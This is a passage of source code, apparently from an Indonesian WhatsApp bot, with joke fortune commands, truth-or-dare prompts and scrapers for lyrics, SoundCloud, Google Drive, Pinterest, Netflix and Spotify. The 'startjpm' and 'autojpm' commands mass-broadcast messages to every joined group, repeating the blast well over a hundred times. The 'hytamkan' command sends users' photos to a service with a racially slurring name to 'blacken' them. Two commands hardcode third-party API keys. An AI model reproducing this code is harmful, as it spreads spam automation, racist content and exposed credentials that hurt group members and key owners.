				if (!mime) return reply(`Kirim/Reply Gambar Waifu Kamu Dengan Caption *${prefix + command}*`);
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '😍 Waifu terbaik sepanjang masa!' : 
					percentage > 50 ? '😊 Lumayan jadi waifu idaman!' :
					'😬 Ehm, mungkin waifu-nya butuh upgrade dikit...';
				reply(`💖 *Cek Waifu*\n\nPersentase waifu Kakak adalah *${percentage}%*\n${komentar}`);
				}
				break;
			

			case 'cekhusbu': {
				if (!quoted) return reply(`Kirim/Reply Gambar Husbu Kamu Dengan Caption *${prefix + command}*`);
				if (!mime) return reply(`Kirim/Reply Gambar Husbu Kamu Dengan Caption *${prefix + command}*`);
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '😍 Husbu terbaik sepanjang masa!' : 
					percentage > 50 ? '😊 Lumayan jadi husbu idaman!' :
					'😬 Ehm, mungkin Husbu-nya butuh upgrade dikit...';
				reply(`💖 *Cek Husbu*\n\nPersentase husbu Kakak adalah *${percentage}%*\n${komentar}`);
				}
				break;

			case 'cekkpribadian': {
				const kepribadian = [
					'🧠 Cerdas dan bijaksana.',
					'❤️ Penuh kasih sayang dan perhatian.',
					'🔥 Bersemangat dan penuh energi.',
					'🎭 Misterius dan sulit ditebak.',
					'😄 Ramah dan menyenangkan.',
					'😎 Cool dan tenang dalam segala situasi.',
					'😅 Sering baperan, tapi baik hati.'
				];
				const randomKepribadian = kepribadian[Math.floor(Math.random() * kepribadian.length)];
				reply(`🪄 *Cek Kepribadian*\n\nKakak memiliki kepribadian:\n${randomKepribadian}`);
}
				break;

			case 'cekmasadepan': {
				const masaDepan = [
					'💼 Akan jadi bos besar di perusahaan ternama!',
					'🏝️ Pensiun muda dan tinggal di pulau tropis.',
					'💖 Akan menemukan cinta sejati dalam waktu dekat.',
					'📚 Akan jadi orang yang sangat berilmu dan dihormati.',
					'💸 Kaya raya dengan bisnis sukses!',
					'🎭 Masa depan Kakak penuh misteri dan kejutan!',
					'😴 Hmm... masa depan Kakak masih kabur, coba lagi nanti.'
				];
				const randomMasaDepan = masaDepan[Math.floor(Math.random() * masaDepan.length)];
				reply(`🔮 *Cek Masa Depan*\n\nRamalan masa depan Kakak:\n${randomMasaDepan}`);
}
				break;
			

			case 'quotesgalau': {
				const quotes = [
					'💔 "Kadang, diam adalah cara terbaik untuk menyampaikan betapa sakitnya hati ini."',
					'🥀 "Kamu tau yang lebih sakit dari patah hati? Berjuang sendirian untuk hubungan yang berdua."',
					'😔 "Aku baik-baik saja, cuma kadang capek pura-pura kuat."',
					'💬 "Kamu adalah alasan senyumku, tapi juga alasan air mataku."',
					'🌧️ "Hujan tahu bagaimana caranya menangis tanpa suara, sama sepertiku."'
				];
				const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
				reply(`💔 *Quotes Galau*\n\n${randomQuote}`);
}
				break;
		

			case 'truth': {
				const truths = [
					'😈 Apa rahasia terbesar yang belum pernah kamu ceritakan ke siapa pun?',
					'🤭 Siapa orang yang diam-diam kamu suka saat ini?',
					'🫣 Pernah bohong sama sahabat sendiri? Tentang apa?',
					'👀 Hal paling memalukan yang pernah kamu alami?',
					'💬 Kalau bisa kembali ke masa lalu, apa yang ingin kamu ubah?'
				];
				const randomTruth = truths[Math.floor(Math.random() * truths.length)];
				reply(`🤔 *Truth*\n\n${randomTruth}`);
}
				break;
			
			case 'dare': {
				const dares = [
					'🔥 Kirim chat "Aku suka kamu" ke kontak terakhir yang kamu chat!',
					'😜 Kirim voice note bilang "Aku adalah manusia paling lucu sedunia."',
					'🤡 Foto selfie dengan ekspresi wajah paling aneh dan kirim ke grup!',
					'🕺 Kirim video kamu joget lagu favorit selama 10 detik.',
					'📸 Post story IG dengan caption "Aku lagi kena dare nih, tolong selamatkan!"'
				];
				const randomDare = dares[Math.floor(Math.random() * dares.length)];
				reply(`😈 *Dare*\n\n${randomDare}`);
}
				break;

			case 'lirik': 
			case 'lyrics': {
				if (!text) return reply(`⚠️ Kak, jangan lupa tulis judul lagunya! 🥺\nContoh: *${prefix + command} Someone Like You*`);
				try {
      conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
const lyrics = {
	search: async (song) => {
		try {
			const { data } = await axios.get(`https://www.lyrics.com/lyrics/${song}`);
			const $ = cheerio.load(data);
			const result = $('.best-matches .bm-case').map((i, element) => {
				const title = $(element).find('.bm-label a').first().text();
				const artist = $(element).find('.bm-label a').last().text();
				const album = $(element).find('.bm-label').eq(1).text().trim().replace(/\s+/g, ' ');
				const imageUrl = $(element).find('.album-thumb img').attr('src');
				const link = $(element).find('.bm-label a').first().attr('href');
				return {
					title,
					artist,
					album,
					imageUrl,
					link: `https://www.lyrics.com${link}`
				};
			}).get();
			return result;
		} catch (error) {
			console.error(`Terjadi kesalahan: ${error.message}`);
		}
	},
	getLyrics: async (url) => {
		try {
			const { data } = await axios.get(url);
			const $ = cheerio.load(data);
			const artistImage = $('#featured-artist-avatar img').attr('src');
			const about = $('.artist-meta .bio').text().trim();
			const year = $('.lyric-details dt:contains("Year:") + dd').text().trim();
			const playlists = $('.lyric-details dt:contains("Playlists") + dd a').text().trim();
			const lyrics = $('#lyric-body-text').text().trim();
			const result = {
				artistImage,
				about,
				year,
				playlists,
				lyrics
			};
			return result;
		} catch (error) {
			console.error(`Terjadi kesalahan: ${error.message}`);
		}
	}
};
					const searchResults = await lyrics.search(text);
					if (searchResults.length === 0) {
						return reply('⚠️ Tidak ada hasil yang ditemukan untuk lagu tersebut. Coba judul lain, ya! 🎶');
					}
					const firstResult = searchResults[0];
					let response = `🎵 *Lirik Lagu Ditemukan!* 🎵\n\n`;
					response += `📌 *Judul:* ${firstResult.title}\n`;
					response += `🎤 *Artis:* ${firstResult.artist}\n`;
					response += `💿 *Album:* ${firstResult.album}\n`;
					response += `🔗 *Lirik Lengkap:* ${firstResult.link}\n`;
					response += `🖼️ *Gambar:* ${firstResult.imageUrl || 'Tidak ada gambar'}\n\n`;
					response += `_Sedang mengambil lirik lengkap, tunggu sebentar..._`;
					await reply(response);
					const lyricsData = await lyrics.getLyrics(firstResult.link);
					let lyricsResponse = `🎼 *Lirik Lengkap: ${firstResult.title}* 🎼\n\n`;
					lyricsResponse += `${lyricsData.lyrics || 'Lirik tidak tersedia.'}\n\n`;
					lyricsResponse += `📅 *Tahun Rilis:* ${lyricsData.year || 'Tidak diketahui'}\n`;
					lyricsResponse += `🎧 *Playlist:* ${lyricsData.playlists || 'Tidak ada playlist'}\n`;
					lyricsResponse += `🖼️ *Artis:* ${lyricsData.artistImage || 'Tidak ada gambar artis'}\n`;
					reply(lyricsResponse);
				} catch (error) {
					console.error(error);
					reply('⚠️ Terjadi kesalahan saat mencari lirik lagu. Coba lagi nanti ya, Kak!');
				}
			}
			break;

			case 'soundcloudsearch':
			case 'scsearch': {
				if (!text) return reply(`⚠️ Eits, kakak lupa kasih kata kunci! 😗 Coba ketik kayak gini ya: *${prefix + command} DJ mama muda* biar Vanzz bisa bantu cari yang kakak mau! 🔍💬`);
				try {
      conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
const scrapeSoundCloud = async (query) => {
	try {
		const url = `https://m.soundcloud.com/search?q=${encodeURIComponent(query)}`;
		const { data } = await axios.get(url);
		const $ = cheerio.load(data);
		let results = [];
		$('.List_VerticalList__2uQYU li').each((index, element) => {
			const title = $(element).find('.Cell_CellLink__3yLVS').attr('aria-label');
			const musicUrl = 'https://m.soundcloud.com' + $(element).find('.Cell_CellLink__3yLVS').attr('href');
			if (title && musicUrl) {
				results.push({ title, url: musicUrl });
			}
		});
		return results.slice(0, 5);
	} catch (error) {
		console.error('Error fetching SoundCloud data:', error);
		return [];
	}
};
					let results = await scrapeSoundCloud(text);	// Panggil fungsi scraper untuk SoundCloud
					if (results.length === 0) return reply('😔 Maaf, kak! Tidak ada hasil yang ditemukan. Coba kata kunci yang lain ya!');
					let teks = `🎧 *Hasil Pencarian SoundCloud untuk:* ${text}\n\n`;
					let list = '';
					let no = 1;
					for (let i of results) {
						list += `\n${no++}. 🎵 *${i.title}*\n` +
							`🔗 *Link:* ${i.url}\n`;
					}
					await conn.sendMessage(
						m.chat,
						{
							text: teks + list
						},
						{ quoted: m }
					);
				} catch (error) {
					console.log(error);
					reply('⚠️ Terjadi kesalahan saat mencari data di SoundCloud, coba lagi nanti ya!');
				}
				}
				break;

			case 'gddl':
			case 'gdrivedl':
			case 'gdrive': {
				if (!text) return reply(`Gunakan dengan cara ${prefix + command} *url*`)
				if (!text.includes('drive')) return reply('Link nggak valid')
				try {
      conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
				const { sizeFormatter } = require('human-readable');
const formatSize = sizeFormatter({
	std: 'JEDEC',
	decimalPlaces: 2,
	keepTrailingZeroes: false,
	render: (literal, symbol) => `${literal} ${symbol}B`
});

async function GDrive(url) {
	let id, res = {
		"error": true
	}
	if (!(url && url.match(/drive\.google/i))) return res
	try {
		id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))[1]
		if (!id) throw 'ID Not Found'
		res = await axios(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
			method: 'post',
			headers: {
				'accept-encoding': 'gzip, deflate, br',
				'content-length': 0,
				'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
				'origin': 'https://drive.google.com',
				'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
				'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
				'x-drive-first-party': 'DriveWebUi',
				'x-json-requested': 'true'
			}
		})
		let {
			fileName,
			sizeBytes,
			downloadUrl
		} = JSON.parse((await res.data).slice(4))
		if (!downloadUrl) throw 'Link Download Limit!'
		let data = await fetch(downloadUrl)
		if (data.status !== 200) return data.statusText
		return {
			downloadUrl,
			fileName,
			fileSize: formatSize(sizeBytes),
			mimetype: data.headers.get('content-type')
		}
	}
	catch (e) {
		console.log(e)
		return res
	}
};
					const res = await GDrive(text);
					if (res.error) return reply('URL tidak valid, periksa ulang apakah akses ke URL sudah public?')
					conn.sendMessage(m.chat, {
						document: {
							url: res.downloadUrl
						},
						mimetype: res.mimetype,
						fileName: res.fileName,
						caption: `*GOOGLE DRIVE*\n\n*Nama:* ${res.fileName}\n*Size:* ${res.fileSize}\n*Type:* ${res.mimetype}`
					}, {
						quoted: m
					})
				} catch (error) {
					console.log(error);
				}
			}
			break;

			case 'savepin': {
				if (!text) return reply(`Example: ${prefix + command} https://pin.it/34Gef3SlC`)
				if (!text.includes('pin')) return reply(`Link Invalid!!`)
				try {
      conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })

async function savePin(url) {
	try {
		const response = await axios.get(`https://www.savepin.app/download.php?url=${encodeURIComponent(url)}&lang=en&type=redirect`);
		const html = response.data;
		const $ = cheerio.load(html);

		let results = [];
		$('td.video-quality').each((index, element) => {
			const type = $(element).text().trim();
			const format = $(element).next().text().trim();
			const downloadLinkElement = $(element).nextAll().find('#submiturl').attr('href');
			if (downloadLinkElement) {
				let downloadLink = downloadLinkElement;
				if (downloadLink.startsWith('force-save.php?url=')) {
					downloadLink = decodeURIComponent(downloadLink.replace('force-save.php?url=', ''));
				}
				results.push({ type, format, downloadLink });
			}
		});
		const title = $('h1').text().trim();

		return {
			title,
			results
		};
	} catch (error) {
		console.error("Error:", error.response ? error.response.data : error.message);
		return { success: false, message: error.message };
	}
};

					const res = await savePin(text);
					const { title, results } = res
					let media = results[0]
					let caption = `✨ *Title:* ${title}\n📥 *Type:* ${media.type}\n📁 *Format:* ${media.format}`
					if (media.format === 'MP4') {
						await conn.sendMessage(m.chat, { caption, video: { url: media.downloadLink } }, { quoted: m })
					} else if (media.format === 'JPG') {
						await conn.sendMessage(m.chat, { caption, image: { url: media.downloadLink } }, { quoted: m })
					} else {
						return reply('Format media tidak didukung.')
					}
				} catch (err) {
					console.error(err)
					reply('Terjadi kesalahan saat memproses permintaan.')
				}
			}
			break;

			case 'ssweb': {
				if (!text) return reply('Masukkan URL untuk di-screenshot!');
      conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
				let sswebfull = `https://api.apiflash.com/v1/urltoimage?access_key=9a202a61afaa4ba0877f12f03e86ea96&url=${encodeURIComponent(text)}&format=png&fresh=true&full_page=true&response_type=json&no_cookie_banners=true&no_ads=true&no_tracking=true&time_zone=Asia/Jakarta`;
				try { 
					let response = await fetch(sswebfull);
					let json = await response.json(); 
					if (!json.url) {
						return reply('Gagal mengambil screenshot. Pastikan URL yang dimasukkan valid.');
					}
					await conn.sendMessage(m.chat, {
						image: {url: json.url},
						caption: "done"
					}, { 
						quoted: m 
					});
				} catch (error) {
					console.error(error);
					reply('Terjadi kesalahan saat mengambil screenshot.');
				}
			}
			break;

case 'hytamkan': {
  if (!/image/.test(mime)) return reply("Reply gambar yang mau dihitamin dengan caption *hitamin*");

  const mediaPath = await conn.downloadAndSaveMediaMessage(qmsg);
  const buffer = fs.readFileSync(mediaPath);
  const base64Image = buffer.toString("base64");
  let media = await conn.downloadAndSaveMediaMessage(quoted);
  
  conn.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
  try {
const axios = require('axios');
    const response = await axios({
      url: "https://negro.consulting/api/process-image",
      method: "POST",
      data: {
        filter: "hitam",
        imageData: "data:image/png;base64," + base64Image
      }
    });

    const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
    await conn.sendMessage(m.chat, { image: resultBuffer, caption: `Selesai, pake filter *hitam*` }, { quoted: m });

    fs.unlinkSync(mediaPath);
  } catch (err) {
    console.log(err);
      let media = await conn.downloadAndSaveMediaMessage(quoted);
  conn.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
    reply("Gagal memproses gambar.");
  }
}
break

case 'outallgc': {
  if (!Access) return reply(mess.owner)
    try {
        const groupData = await conn.groupFetchAllParticipating()
        const groups = Object.entries(groupData).map(([id, data]) => ({
            id,
            name: data.subject
        }))

        if (!groups.length) return reply('Tidak ada grup yang bisa ditinggalkan.')

        let success = 0
        let failed = 0
        const log = []

        reply(`Memulai proses keluar dari ${groups.length} grup...`)

        for (const group of groups) {
            try {
                await conn.groupLeave(group.id)
                success++
                log.push(`✅ Berhasil keluar dari: ${group.name || 'Grup Tanpa Nama'}`)
                await new Promise(resolve => setTimeout(resolve, 1000)) // Cooldown
            } catch (e) {
                failed++
                log.push(`❌ Gagal keluar dari: ${group.name || 'Grup Tanpa Nama'} (${e.message})`)
            }
        }

        const result = [
            `*Hasil Keluar Grup:*`,
            `Total Grup: ${groups.length}`,
            `Berhasil: ${success}`,
            `Gagal: ${failed}`,
            ``,
            ...log.slice(0, 5),
            log.length > 5 ? `\nDan ${log.length - 5} log lainnya...` : ''
        ].join('\n')

        await conn.sendMessage(m.chat, {
            text: result,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true
            }
        })

    } catch (e) {
        console.error(e)
        reply('Terjadi error saat proses keluar grup.')
    }
}
    break

case 'topnetflix': case 'netflixtrending': {
    const fetch = require('node-fetch')
    const fs = require('fs')
    const netflixTrending = async () => {
        const religion = [
            "/id",
            "/id-en"
        ]
        const netflixUrl = "https://www.netflix.com" + religion[0] // bisa ubah ke [1] kalau mau versi English
        const response = await fetch(netflixUrl)
        if (!response.ok) throw Error(`Request error: ${response.status} ${response.statusText}\n${await response.text()}`)
        const html = await response.text()
        const jsonString = html.match(/reactContext = (.*?);/)?.[1]
        if (!jsonString) throw Error(`Tidak menemukan data pada Netflix`)
        const cleaned = jsonString.replace(/\\x([0-9A-Fa-f]{2})/g, (_, hex) =>
            String.fromCharCode(parseInt(hex, 16)))
        const json = JSON.parse(cleaned)
        const movieAndShow = Object.entries(json.models.graphql.data).filter(v =>
            !v?.[1]?.__typename.match(/Genre|Query/))
        const result = movieAndShow.map(([_, v]) => {
            const genreList = v.coreGenres.edges.map(v => v.node.__ref)
            return {
                title: v.title,
                latestYear: v.latestYear,
                videoId: v.videoId,
                shortSynopsis: v.shortSynopsis,
                contentAdvisory: v.contentAdvisory?.certificationValue || "-",
                genre: genreList.map(ref => json.models.graphql.data[ref]?.name || '').join(", "),
                type: v.__typename,
                url: netflixUrl + "/title/" + v.videoId,
                poster: v['artwork({\"params\":{\"artworkType\":\"BOXSHOT\",\"dimension\":{\"width\":200},\"features\":{\"performNewContentCheck\":false,\"suppressTop10Badge\":true},\"format\":\"JPG\"}})']?.url
            }
        })
        return result
    }
    try {
        const trending = await netflixTrending()
        const formatted = trending.slice(0, 10).map((v, i) => 
`📺 *${v.title}* (${v.latestYear})
🎞️ Tipe: ${v.type}
🔞 Rating: ${v.contentAdvisory}
🎭 Genre: ${v.genre}
📝 Sinopsis: ${v.shortSynopsis}
🔗 ${v.url}
🖼️ Poster: ${v.poster}`).join('\n\n')
        m.reply(`*🎬 Netflix Trending Saat Ini:*\n\n${formatted}`)
    } catch (err) {
        m.reply('⚠️ Gagal mengambil data Netflix!\n\n' + err.message)
    }
}
    break

case 'cekbola': {
const axios = require('axios');

const API_KEY = 'cfceb5516249f8a97265a6e05e86969d'; // JANGAN GANTI
const headers = {  
    'x-apisports-key': API_KEY  
};  

const liveEndpoint = `https://v3.football.api-sports.io/fixtures?live=all`;  
const skorTerakhir = {};  

async function pantauPertandinganLive() {  
    try {  
        const res = await axios.get(liveEndpoint, { headers });  
        const liveMatches = res.data.response;  

        if (liveMatches.length === 0) {  
            await conn.sendMessage(from, { text: '⚽ Tidak ada pertandingan yang sedang berlangsung saat ini.' });  
            return;  
        }  

        for (const match of liveMatches) {  
            const id = match.fixture.id;  
            const home = match.teams.home.name;  
            const away = match.teams.away.name;  
            const score = `${match.goals.home} - ${match.goals.away}`;  
            const status = match.fixture.status.short;  

            if (!skorTerakhir[id]) {  
                skorTerakhir[id] = score;  
                await conn.sendMessage(from, { text: `🎮 *Live Match*\n${home} vs ${away}\nSkor: ${score}` });  
            } else if (skorTerakhir[id] !== score) {  
                skorTerakhir[id] = score;  
                await conn.sendMessage(from, { text: `⚽ *GOL!*\n${home} vs ${away}\nSkor Baru: ${score}` });  
            }  

            if (status === 'FT' && !skorTerakhir[`${id}_done`]) {  
                skorTerakhir[`${id}_done`] = true;  
                await conn.sendMessage(from, { text: `⏹️ *Full Time*\n${home} vs ${away}\nFinal Score: ${score}` });  
            }  
        }  
    } catch (err) {  
        console.error('❌ Gagal ambil live score:', err.message);  
        await conn.sendMessage(from, { text: '❌ Gagal mengambil data pertandingan live.' });  
    }  
}  

pantauPertandinganLive();  
setInterval(pantauPertandinganLive, 30000); // cek tiap 30 detik

}
break;

case 'yts': case 'ytsearch': {
if (!text) return reply(`Example : ${prefix + command} story wa anime`);
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\nHasil Pencarian dari: ${text}\n\n`;
    let no = 1;
    let hasilPencarian = search.all.map(v => `${no++}. ${v.title}\n[Link]: ${v.url}`).join('\n\n');
    teks += hasilPencarian;
    await conn.sendMessage(m.chat, { text: teks }, { quoted: m });
}
searchYouTube(text);
          }
            break

case 'spdl': case 'spotifydl': {
if (!text) return reply('Masukan Link')
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
      result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};
let result = await spotifydl(text)
let captionvid = `*∘ Title: ${result.title}*\n*∘ Artist: ${result.artis}*`
 const p = await new canvafy.Spotify()
            .setTitle(result.title)
            .setAuthor("Spotify - Downloader")
            .setTimestamp(40, 100)
            .setOverlayOpacity(0.8)
            .setBorder("#fff", 0.8)
            .setImage(result.image)
            .setBlur(3)
            .build(); 

       await conn.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
    conn.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'Selly' }, { quoted: m });
}
break

case "startjpm": {
if (!Access) return reply(mess.owner)
    if (!q) return reply(example("teksnya bisa dengan kirim foto juga"));
    
    let rest;
    if (/image/.test(mime)) {
        rest = await conn.downloadAndSaveMediaMessage(qmsg);
    }

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    const ttks = text;
    const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks };
    const opsijpm = rest !== undefined ? "teks & foto" : "teks";
    const jid = m.chat;

    for (let i of res) {
        try {
            await conn.sendMessage(i, pesancoy, { quoted: null });
            count++;
        } catch {}
        await sleep(3500);
    }

    if (rest !== undefined) await fs.unlinkSync(rest);
}
break;

case "autojpm": {
    if (!Access) return reply(mess.owner)
    if (!q) return reply(example("mna teks ny"));

    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
        await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
